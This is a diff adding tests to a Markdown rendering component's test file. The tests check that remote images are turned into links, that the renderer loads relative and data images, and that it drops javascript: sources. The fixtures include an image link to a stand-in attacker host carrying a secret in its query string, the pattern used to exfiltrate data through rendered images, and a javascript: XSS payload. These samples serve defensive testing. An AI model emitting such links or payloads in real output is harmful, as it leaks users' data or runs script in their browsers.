@@ -50,6 +50,39 @@ describe('Markdown', () => {
     expect(screen.queryByRole('link', { name: 'proto' })).toBeNull();
   });
 
+  it('renders remote images as links, never loading them', () => {
+    const { container } = render(
+      <Markdown>{'![x](https://evil.example/p.png?d=SECRET)'}</Markdown>,
+    );
+    expect(container.querySelector('img')).toBeNull();
+    const link = screen.getByRole('link', { name: 'x' });
+    expect(link).toHaveAttribute('href', 'https://evil.example/p.png?d=SECRET');
+  });
+
+  it('renders same-origin relative images as <img>', () => {
+    const { container } = render(<Markdown>{'![diagram](/files/diagram.png)'}</Markdown>);
+    const img = container.querySelector('img');
+    expect(img).not.toBeNull();
+    expect(img).toHaveAttribute('src', '/files/diagram.png');
+    expect(img).toHaveAttribute('alt', 'diagram');
+  });
+
+  it('renders inline data:image srcs as <img>', () => {
+    const { container } = render(
+      <Markdown>{'![chart](data:image/png;base64,AAAA)'}</Markdown>,
+    );
+    const img = container.querySelector('img');
+    expect(img).not.toBeNull();
+    expect(img).toHaveAttribute('src', 'data:image/png;base64,AAAA');
+  });
+
+  it('drops javascript: image srcs without rendering an image or link', () => {
+    const { container } = render(<Markdown>{'![x](javascript:alert(1))'}</Markdown>);
+    expect(container.querySelector('img')).toBeNull();
+    expect(screen.queryByRole('link', { name: 'x' })).toBeNull();
+    expect(screen.getByText('x')).toBeInTheDocument();
+  });
+
   it('gives headings unique ids only when asked', () => {
     const md = '## Known Issues\n\n## Known Issues\n\n### `k8s` migration';
     const { container, rerender } = render(<Markdown>{md}</Markdown>);
